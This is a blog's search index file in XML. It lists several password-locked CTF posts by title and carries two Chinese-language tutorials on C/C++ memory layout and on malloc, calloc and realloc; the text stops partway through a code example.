<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF-Basic-knowledge</title>
      <link href="/post/CTF-Basic-knowledge/"/>
      <url>/post/CTF-Basic-knowledge/</url>
      
        <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SMB-Information-leakage</title>
      <link href="/post/CTF-SMB-Information-leakage/"/>
      <url>/post/CTF-SMB-Information-leakage/</url>
      
        <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SMB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SSH服务渗透测试</title>
      <link href="/post/CTF-SSH-service-penetration/"/>
      <url>/post/CTF-SSH-service-penetration/</url>
      
        <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SSH私钥泄漏</title>
      <link href="/post/CTF-SSH-private-key-leak/"/>
      <url>/post/CTF-SSH-private-key-leak/</url>
      
        <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C/C++ 语言内存管理</title>
      <link href="/post/memory-management/"/>
      <url>/post/memory-management/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-内存存储结构"><font color="#03a9f4" face="Comic sans MS">0x01 内存存储结构</font><a href="post/memory-management#0x01-内存存储结构"></a></h2><blockquote><p>为什么要这么分配内存？<br>（1）一个进程在运行过程中，代码是根据流程依次执行的，只需要访问一次，当然跳转和递归有可能使代码执行多次，而数据一般都需要访问多次，因此单独开辟空间以方便访问和节约空间。<br>（2）临时数据及需要再次使用的代码在运行时放入栈区中，生命周期短。<br>（3）全局数据和静态数据有可能在整个程序执行过程中都需要访问，因此单独存储管理。<br>（4）堆区由用户自由分配，以便管理。</p></blockquote><p>存储结构分为：<strong>可执行代码存储时结构</strong>和<strong>运行时存储结构</strong>。结构图如下，左边为可执行代码存储时结构，右边为运行时存储结构。</p><div class="article-img"><p><img src="https://i.loli.net/2019/06/17/5d0735f3ea5bb52011.png" alt="806053-20170722131756261-1095755633.png" data-zoomable></p></div><h3 id="0x001-可执行代码存储时结构"><font color="#3CB371" face="Comic sans MS">0x001 可执行代码存储时结构</font><a href="post/memory-management#0x001-可执行代码存储时结构"></a></h3><p>当一个<strong><code>.c</code></strong>或<strong><code>.cpp</code></strong>文件编译后生    成可执行文件时，可执行文件在存储（也就是还没有载入到内存中）的时候，分为：<font color="#FF7F00"><strong>代码区</strong></font>、<font color="#FF7F00"><strong>数据区</strong></font>和<font color="#FF7F00"><strong>未初始化数据区</strong></font>3个部分。</p><blockquote><p>注意：</p><ul><li>代码区：text segment</li><li>数据区：局初始化数据区/静态数据区（initialized data segment/data segment）</li><li>未初始化区：亦称BSS区（uninitialized data segment）</li></ul></blockquote><ol><li><p><strong>代码区</strong>（text segment）。存放CPU执行的机器指令（machine instructions）。通常，代码区是<font color="#FF7F00"><strong>可共享</strong></font>的（即另外的执行程序可以调用它），因为对于频繁被执行的程序，只需要在内存中有一份代码即可。代码区通常是<font color="#FF7F00"><strong>只读</strong></font>的，使其只读的原因是防止程序意外地修改了它的指令。另外，代码区还规划了局部变量的相关信息。</p></li><li><p><strong>全局初始化数据区/静态数据区</strong>（initialized data segment/data segment）。该区包含了在程序中明确<font color="#FF7F00"><strong>已被初始化的全局变量、静态变量</strong></font>（包括全局静态变量和局部静态变量）和常量数据（如字符串常量）。</p></li><li><p><strong>未初始化数据区</strong>。亦称BSS区（uninitialized data segment），存入的是<font color="#FF7F00"><strong>全局未初始化变量</strong></font>。BSS这个叫法是根据一个早期的汇编运算符而来，这个汇编运算符标志着一个块的开始。BSS区的数据在程序开始执行之前被内核初始化为0或者空指针（NULL）</p></li></ol><h3 id="0x002-运行时存储结构"><font color="#3CB371" face="Comic sans MS">0x002 运行时存储结构</font><a href="post/memory-management#0x002-运行时存储结构"></a></h3><p>一个正在运行着的C编译程序占用的内存分为<strong>代码区</strong>、<strong>初始化数据区</strong>、<strong>未初始化数据区</strong>、<strong>堆区</strong>和<strong>栈区</strong>5个部分。</p><ol><li><p>代码区（text segment/code segment）。代码区指令根据程序设计流程依次执行，对于顺序指令，则只会执行一次（每个进程），如果反复，则需要使用跳转指令，如果进行递归，则需要借助栈来实现。</p><ul><li><strong>代码段（区）</strong>：定义： 代码段（code segment/text segment ）通常是指用来存放程序执行代码的一块内存区域。这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读, 某些架构也允许代码段为可写，即允许修改程序。在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。代码区的指令中包括操作码和要操作的对象（或对象地址引用）。如果是立即数（即具体的数值，如5），将直接包含在代码中；如果是局部数据，将在栈区分配空间，然后引用该数据地址；如果是BSS区和数据区，在代码中同样将引用该数据地址。另外，代码段还规划了局部数据所申请的内存空间信息。</li></ul></li><li><p>全局初始化数据区/静态数据区（Data Segment）。只初始化一次。</p><ul><li><strong>数据段（区）</strong>： 数据段（data segment ）通常是指用来存放程序中已初始化的全局变量的一块内存区域。数据段属于静态内存分配。data段中的静态数据区存放的是程序中已初始化的全局变量、静态变量和常量。</li></ul></li><li><p>未初始化数据区（BSS）。在运行时改变其值。</p><ul><li><strong>BSS 段（区）</strong>： BSS 段（bss segment ）通常是指用来存放程序中未初始化的全局变量的一块内存区域。BSS 是英文Block Started by Symbol 的简称。BSS 段属于静态内存分配，即程序一开始就将其清零了。一般在初始化时BSS段部分将会清零。</li></ul></li><li><p>栈区（stack）。由编译器自动分配释放，存放函数的参数值、局部变量的值等。存放函数的参数值、局部变量的值，以及在进行任务切换时存放当前任务的上下文内容。其操作方式类似于数据结构中的栈。每当一个函数被调用，该函数返回地址和一些关于调用的信息，比如某些寄存器的内容，被存储到栈区。然后这个被调用的函数再为它的自动变量和临时变量在栈区上分配空间，这就是C实现函数递归调用的方法。每执行一次递归函数调用，一个新的栈框架就会被使用，这样这个新实例栈里的变量就不会和该函数的另一个实例栈里面的变量混淆。</p><ul><li><strong>栈(stack)</strong> ：栈又称<font color="#FF7F00"><strong>堆栈</strong></font>， 是用户存放程序临时创建的局部变量，也就是说我们函数括弧”{}”中定义的变量（但不包括static 声明的变量，static 意味着在数据段中存放变量）。除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈的先进先出特点，所以栈特别方便用来保存/ 恢复调用现场。从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区。</li></ul></li><li><p>堆区（heap）。用于动态内存分配。堆在内存中位于bss区和栈区之间。一般由程序员分配和释放，若程序员不释放，程序结束时有可能由OS回收。</p><ul><li><strong>堆(heap)</strong>： 堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc 等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free 等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。在将应用程序加载到内存空间执行时，操作系统负责代码段、数据段和BSS段的加载，并将在内存中为这些段分配空间。栈段亦由操作系统分配和管理，而不需要程序员显示地管理；堆段由程序员自己管理，即显式地申请和释放空间。</li></ul></li></ol><p>C语言程序编译完成之后，已初始化的全局变量保存在DATA段中，未初始化的全局变量保存在BSS段中。TEXT和DATA段都在可执行文件中，由系统从可执行文件中加载；而BSS段不在可执行文件中，由系统初始化。BSS段只保存没有值的变量，所以事实上它并不需要保存这些变量的映像。运行时所需要的BSS段大小记录在目标文件中，但是BSS段并不占据目标文件的任何空间。</p><p>以下两图来自于《C语言专家编程》</p><div class="article-img"><p><img src="https://s2.ax1x.com/2019/06/17/VHfXtO.png" alt="VHfXtO.png" data-zoomable></p></div><div class="article-img"><p><img src="https://s2.ax1x.com/2019/06/17/VHfjhD.png" alt="VHfjhD.png" data-zoomable></p></div><br><h3 id="0x003-几个基本概念"><font color="#3CB371" face="Comic sans MS">0x003 几个基本概念</font><a href="post/memory-management#0x003-几个基本概念"></a></h3><p>在C语言中，关于内存管理的知识点比较多，如函数、变量、作用域、指针等，在探究C语言内存管理机制时，先简单复习下这几个基本概念：</p><ol><li><p>变量：需要搞清楚这几种变量类型：</p><ul><li>全局变量（外部变量）：出现在代码块<strong><code>{}</code></strong>之外的变量就是全局变量。</li><li>局部变量（自动变量）：一般情况下，代码块<strong><code>{}</code></strong>内部定义的变量就是自动变量，也可使用auto显示定义。</li><li>静态变量：是指内存位置在程序执行期间一直不改变的变量，用关键字static修饰。代码块内部的静态变量只能被这个代码块内部访问，代码块外部的静态变量只能被定义这个变量的文件访问。</li></ul></li></ol><p>注意：extern修饰变量时，根据具体情况，既可以看作是定义也可以看作是声明；但extern修饰函数时只能是定义，没有二义性。</p><ol start="2"><li><p>作用域：通常指的是变量的作用域，广义上讲，也有函数作用域及文件作用域等。我理解的作用域就是指某个事物能够存在的区域或范围，比如一滴水只有在0-100摄氏度之间才能存在，超出这个范围，广义上讲的“水”就不存在了，它就变成了冰或气体。</p></li><li><p>函数：不解释。</p></li></ol><p>注意：C语言中函数默认都是全局的，可以使用static关键字将函数声明为静态函数（只能被定义这个函数的文件访问的函数）。</p><h2 id="0x02-栈与堆"><font color="#03a9f4" face="Comic sans MS">0x02 栈与堆</font><a href="post/memory-management#0x02-栈与堆"></a></h2><p>栈与堆是两个概念，特别要注意<font color="#FF7F00"><strong>数据结构</strong></font>中的栈与堆和<font color="#FF7F00"><strong>内存管理中</strong></font>的栈与堆是<strong>两个不相关</strong>的概念。</p><h3 id="0x001-数据结构中的栈与堆"><font color="#3CB371" face="Comic sans MS">0x001 数据结构中的栈与堆</font><a href="post/memory-management#0x001-数据结构中的栈与堆"></a></h3><p><strong>栈</strong>：是一种连续储存的数据结构，具有先进后出的性质。通常的操作有入栈（圧栈）、出栈和栈顶元素。想要读取栈中的某个元素，就要将其之前的所有元素出栈才能完成。类比现实中的箱子一样。</p><blockquote><p>栈是一种运算受限的线性表，其限制是指只仅允许在表的一端进行插入和删除操作，这一端被称为栈顶（Top），相对地，把另一端称为栈底（Bottom）。把新元素放到栈顶元素的上面，使之成为新的栈顶元素称作进栈、入栈或压栈（Push）；把栈顶元素删除，使其相邻的元素成为新的栈顶元素称作出栈或退栈（Pop）。这种受限的运算使栈拥有“先进后出”的特性（First In Last Out），简称FILO。<br>栈分顺序栈和链式栈两种。栈是一种线性结构，所以可以使用数组或链表（单向链表、双向链表或循环链表）作为底层数据结构。使用数组实现的栈叫做顺序栈，使用链表实现的栈叫做链式栈，二者的区别是顺序栈中的元素地址连续，链式栈中的元素地址不连续。</p></blockquote><p><strong>堆</strong>：是一种非连续的树形储存数据结构，每个节点有一个值，整棵树是经过排序的。特点是根结点的值最小（或最大），且根结点的两个子树也是一个堆。常用来实现优先队列，存取随意。</p><blockquote><p>像是一颗倒立的大树：堆是一种经过排序的树形数据结构，每个节点都有一个值。通常我们所说的堆的数据结构是指二叉树。堆的特点是根节点的值最小（或最大），且根节点的两个树也是一个堆。由于堆的这个特性，常用来实现优先队列，堆的存取是随意的，这就如同我们在图书馆的书架上取书，虽然书的摆放是有顺序的，但是我们想取任意一本时不必像栈一样，先取出前面所有的书，书架这种机制不同于箱子，我们可以直接取出我们想要的书。</p></blockquote><h3 id="0x002-内存分配中的堆和栈"><font color="#3CB371" face="Comic sans MS">0x002 内存分配中的堆和栈</font><a href="post/memory-management#0x002-内存分配中的堆和栈"></a></h3><p><strong>栈</strong>：是由编译器在需要时自动分配的，不需要时自动清除的变量存储区。里面的变量通常是局部变量、函数参数等。<br><strong>堆</strong>：是由malloc()等函数或new分配的内存块，内存释放由程序员手动控制，在C语言为free函数完成。</p><p><font size="4"><strong>栈和堆的主要区别有以下几点：</strong></font></p><ol><li><p><font color="#FF7F00"><strong>申请方式和回收方式不同(管理方式不同)。</strong></font>栈编译器自动管理，无需程序员手工控制；而堆空间的申请释放工作由程序员控制，容易产生内存泄漏。</p></li><li><p><font color="#FF7F00"><strong>内存增长方向不同。</strong></font>堆的增长方向是向上的，即向着内存地址增加的方向；栈的增长方向是向下的，即向着内存地址减小的方向。这和栈申请大小是相关的，因为栈顶的地址和栈的最大容量是系统预先规定好的，所以再次申请地址时只能从高地址向低地址存放局部变量或者形式参数。</p></li><li><p><font color="#FF7F00"><strong>申请大小的限制。</strong></font></p></li></ol><p><strong>栈</strong>是向低地址扩展的数据结构，是一块连续的内存区域。这句话的意思是栈顶的地址和栈的最大容量是系统预先规定好的，当申请的空间超过栈的剩余空间时，将提示溢出。因此，用户能从栈获得的<strong>空间较小</strong>。栈不会很大，一般都是以K为单位。如果在程序中直接将较大的数组保存在函数内的栈变量中，很可能会内存溢出，严格来说应该叫栈溢出（当栈空间以满，但还往栈内存压变量，这个就叫栈溢出）。<br><strong>堆</strong>是向高地址扩展的数据结构，是不连续的内存区域。因为系统是用链表来存储空闲内存地址的，且链表的遍历方向是由低地址向高地址。由此可见，堆获得的空间较灵活，也较大。栈中元素都是一一对应的，不会存在一个内存块从栈中间弹出的情况。</p><ol start="4"><li><font color="#FF7F00"><strong>申请后系统的响应不同。</strong></font></li></ol><p><strong>栈：</strong>只要栈的剩余空间大于所申请空间，系统将为程序提供内存，否则将报异常提示栈溢出。<br><strong>堆：</strong>首先应该知道操作系统有一个记录空闲内存地址的链表，当系统收到程序的申请时，会遍历该链表，寻找第一个空间大于所申请空间的堆结点，然后将该结点从空闲结点链表中删除，并将该结点的空间分配给程序。对于大多数系统，会在这块内存空间中的首地址处记录本次分配的大小，这样，代码中的delete语句才能正确的释放本内存空间。由于找到的堆结点的大小不一定正好等于申请的大小，系统会自动的将多余的那部分重新放入空闲链表中。也就是说堆会在申请后还要做一些后续的工作这就会引出申请效率的问题。</p><ol start="5"><li><font color="#FF7F00"><strong>分配效率不同。</strong></font></li></ol><p><strong>栈：</strong>由系统自动分配，速度较快。但程序员是无法控制的。<br><strong>堆：</strong>是由new分配的内存，一般速度比较慢，而且容易产生内存碎片，不过用起来最方便。</p><blockquote><p>栈是机器系统提供的数据结构，计算机会在底层对栈提供支持：分配专门的寄存器存放栈的地址，压栈出栈都有专门的指令执行。堆则是C函数库提供的，它的机制很复杂，例如为了分配一块内存，库函数会按照一定的算法（具体的算法可以参考数据结构/操作系统）在堆内存中搜索可用的足够大的空间，如果没有足够大的空间（可能是由于内存碎片太多），就有需要操作系统来重新整理内存空间，这样就有机会分到足够大小的内存，然后返回。显然，堆的效率比栈要低得多。</p></blockquote><ol start="6"><li><font color="#FF7F00"><strong>是否产生碎片。</strong></font></li></ol><p><strong>堆：</strong>对于堆来讲，频繁的malloc/free（new/delete）势必会造成内存空间的不连续，从而<strong>造成大量的碎片</strong>，使程序效率降低（虽然程序在退出后操作系统会对内存进行回收管理）。<br><strong>栈：</strong>对于栈来讲，则不会产生碎片。</p><ol start="7"><li><font color="#FF7F00"><strong>栈和堆中的存储内容不同。</strong></font></li></ol><p><strong>栈：</strong>在函数调用时，第一个进栈的是主函数中后的下一条指令（函数调用语句的下一条可执行语句）的地址，然后是函数的各个参数，在大多数的C编译器中，参数是由右往左入栈的，然后是函数中的局部变量。注意静态变量是不入栈的。当本次函数调用结束后，局部变量先出栈，然后是参数，最后栈顶指针指向最开始存的地址，也就是主函数中的下一条指令，程序由该点继续运行。栈中的内存是在程序编译完成以后就可以确定的，不论占用空间大小，还是每个变量的类型。<br><strong>堆：</strong>一般是在堆的头部用一个字节存放堆的大小。堆中的具体内容由程序员安排。</p><p>下面附上一张栈和堆地址增长方向的对比图：<br><img src="https://i.loli.net/2019/06/17/5d0759163057393552.png" alt="806053-20170723012539965-796179889.png"></p><h2 id="0x03-操作系统中的内存分配"><font color="#03a9f4" face="Comic sans MS">0x03 操作系统中的内存分配</font><a href="post/memory-management#0x03-操作系统中的内存分配"></a></h2><p>操作系统在管理内存时，最小单位不是字节，而是内存页（32位操作系统的内存页一般是4K）。比如，初次申请1K内存，操作系统会分配1个内存页，也就是4K内存。4K是一个折中的选择，因为：内存页越大，内存浪费越多，但操作系统内存调度效率高，不用频繁分配和释放内存；内存页越小，内存浪费越少，但操作系统内存调度效率低，需要频繁分配和释放内存。嵌入式系统的内存内存资源很稀缺，其内存页会更小，因此在嵌入式开发当中需要特别注意。</p><br><p>参考资料：</p><ul><li><font color="#00B2EE"><a href="https://www.cnblogs.com/tuhooo/p/7221136.html" target="_blank" rel="noopener">《深入理解C语言内存管理》</a></font></li><li><font color="#00B2EE"><a href="https://www.cnblogs.com/yif1991/p/5049638.html" target="_blank" rel="noopener">《C语言知识整理（3）：内存管理（详细版）》</a></font></li><li><font color="#00B2EE"><a href="https://www.cnblogs.com/kimiway/p/3224607.html" target="_blank" rel="noopener">《C语言内存管理详解》</a></font></li><li><font color="#00B2EE"><a href="https://blog.csdn.net/K346K346/article/details/80849966" target="_blank" rel="noopener">《堆与栈的区别》</a></font></li><li><font color="#00B2EE"><a href="https://blog.csdn.net/qq_41035588/article/details/81953424" target="_blank" rel="noopener">《【C语言】数据结构和内存中的堆和栈》</a></font></li></ul>]]></content>
      
      
      <categories>
          
          <category> C&amp;C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C-Memory </tag>
            
            <tag> 内存管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C/C++ Memory Application</title>
      <link href="/post/memory/"/>
      <url>/post/memory/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-malloc-amp-calloc"><font color="#03a9f4" face="Comic sans MS">0x01 malloc() &amp; calloc()</font><a href="post/memory#0x01-malloc-amp-calloc"></a></h2><ul><li><p><strong>void *malloc ( size );</strong></p><ul><li>malloc的作用是在内存的动态存储区中分配一个长度为size的<font color="#FF7F00"><strong>连续空间</strong></font>。如果由malloc()函数分配的内存空间原来没有被使用过，则其中的每一位可能都是0；反之,如果这部分内存曾经被分配过,则其中可能遗留有各种各样的数据。所以一般mallc()要配合memset()函数使用。</li></ul></li><li><p><strong>void *calloc ( n, size );</strong></p><ul><li>calloc() 在内存中动态地分配 n 个长度为 size 的<font color="#FF7F00"><strong>连续空间</strong></font>，并将每一个字节都初始化为 0。所以它的结果是分配了 num x size 个字节长度的内存空间，并且每个字节的值都是0。</li></ul><br></li></ul><p><font color="#FF7F00"><strong>1. 相似点：</strong></font></p><ol><li>动态内存申请都需要用到头文件<strong><code>#include &lt;stdlib.h&gt;</code></strong>。</li><li>malloc()、calloc()申请的内存类型都是 <strong><code>void*</code></strong> 类型的，需要强制转化为指定类型；</li></ol><p> <strong>注意：</strong>函数的返回值类型是<strong><code>void*</code></strong>，void 并不是说没有返回值或者返回空指针，而是返回的指针类型未知。所以在使用 calloc() 时通常需要进行强制类型转换，将 void 指针转换成我们希望的类型，例如：</p><pre class="line-numbers language-c"><code class="language-c"> <span class="token keyword">char</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 分配100个字节的内存空间</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li><p><strong>返回值：</strong></p><ul><li>如果调用成功,函数malloc()和函数calloc()都将返回所分配的内存空间的<font color="#FF7F00"><strong>首地址</strong></font>。</li><li>如果调用失败，则返回 NULL。</li></ul></li><li><p><strong>申请了内存空间后，必须检查是否分配成功</strong>。</p><ul><li>函数同样要注意这点：如果所申请的内存块大于目前堆上剩余内存块（整块），则内存分配会失败，函数返回NULL。注意这里说的“堆上剩余内存块”不是所有剩余内存块之和，是指堆上剩余内存块中与上次申请的内存地址连续的那部分，因为malloc函数申请的是<strong>连续的一块内存</strong>。既然malloc函数申请内存有不成功的可能，那我们在使用指向这块内存的指针时，必须用<strong><code>if（p!=NULL）</code></strong>语句来验证内存确实分配成功了。</li></ul></li><li><p>二者返回的地址是连续的：下面两种方式申请<strong>地址大小</strong>是相等的</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>str1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>str2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><br><p><font color="#FF7F00"><strong>2. 不相同点：</strong></font></p><ol><li>函数malloc()和函数calloc()的主要区别是<strong>前者不能初始化所分配的内存空间,而后者能</strong>。如果由malloc()函数分配的内存空间原来没有被使用过，则其中的每一位可能都是0；反之，如果这部分内存曾经被分配过，则其中可能遗留有各种各样的数据。</li><li>函数calloc()会将所分配的内存空间中的每一位都初始化为零，也就是说,如果你是为字符类型或整数类型的元素分配内存，那么这些元素将保证会被初始化为0；如果你是为指针类型的元素分配内存,那么这些元素通常会被初始化为空指针；如果你为实型数据分配内存，则这些元素会被初始化为浮点型的零。</li><li>calloc 可以代替 malloc + memset，但是 malloc + memset 代替不了 calloc。 calloc 大块内存时，如果是从系统分配，就可以免了 memset 的操作，快很多。memset可以设任意数，calloc只能设0 。calloc表示申请 n x size大小的内存，malloc只有一个参数。</li></ol><br><p><font color="#FF7F00"><strong>3. 以下两种方式完全等价：</strong></font></p><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">// calloc() 分配内存空间并初始化</span><span class="token keyword">char</span> <span class="token operator">*</span>str1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// malloc() 分配内存空间并用 memset() 初始化</span><span class="token keyword">char</span> <span class="token operator">*</span>str2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x02-realloc"><font color="#03a9f4" face="Comic sans MS">0x02 realloc()</font><a href="post/memory#0x02-realloc"></a></h2><p>函数原型：<strong><code>realloc(void *p, addsize)</code></strong></p><p><strong>一、基本特性</strong></p><ol><li><p>realloc()函数可以重用或扩展以前用malloc()、calloc()及realloc()函数自身分配的内存。</p></li><li><p>realloc()函数需两个参数：一个是包含地址的指针（该地址由之前的malloc()、calloc()或realloc()函数返回），另一个是要新分配的内存字节数。</p></li><li><p>realloc()函数分配第二个参数指定的内存量，并把第一个参数指针指向的之前分配的内容复制到新配的内存中，且复制的内容长度等于新旧内存区域中较小的那一个。即新内存大于原内存，则原内存所有内容复制到新内存，如果新内存小于原内存，只复制长度等于新内存空间的内容。</p></li><li><p>realloc()函数的第一个参数若为空指针，相当于分配第二个参数指定的新内存空间，此时等价于malloc()、calloc()或realloc()函数。</p></li><li><p>如果是将分配的内存扩大，则有以下3种情况：</p><blockquote><ul><li>如果当前内存段后面有需要的内存空间，则直接扩展这段内存空间，realloc()将返回<strong>原指针</strong>。  </li><li>如果当前内存段后面的空闲字节不够，那么就使用堆中的第一个能够满足这一要求的内存块，将目前的数据复制到新的位置，并<font color="red" size="5"><strong>自动</strong></font>将原来的数据块释放掉，不需要使用free()再释放一次，返回新的内存块首地址（不同于之前malloc申请的首地址）。</li><li>如果申请失败，将返回NULL，此时，原来的指针仍然有效。</li></ul></blockquote><br></li></ol><p><strong>二、注意事项</strong></p><ol><li><p><strong>第一个参数要么是空指针，要么是指向以前分配的内存。如果不指向以前分配的内存或指向已释放的内存，结果就是不确定的。</strong></p></li><li><p><font color="#FF7F00"><strong>如果调用成功，不管当前内存段后面的空闲空间是否满足要求，都会释放掉原来的指针，重新返回一个指针，虽然返回的指针有可能和原来的指针一样，即不能再次释放掉原来的指针。</strong></font></p></li></ol><p>举例（不需要手动free释放原来的首地址指针，realloc若新申请成功会自动释放原来的首地址。），实现在一个按升序排序的数组中查找x应插入的位置，将x插入数组中，使数组元素仍按升序排列。<br><strong>注意：</strong>注意代码45行 <strong><code>free(pNumber);</code></strong>，如果注释掉，则结果正确。如果不注释掉则错误。</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> insert_data <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token operator">*</span>pNumber <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token operator">*</span>pNewArray <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Input array size:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    pNumber <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pNumber <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Not enough memory\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//输入插入前已按升序排序的数组元素提示信息</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Input array:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> pNumber<span class="token 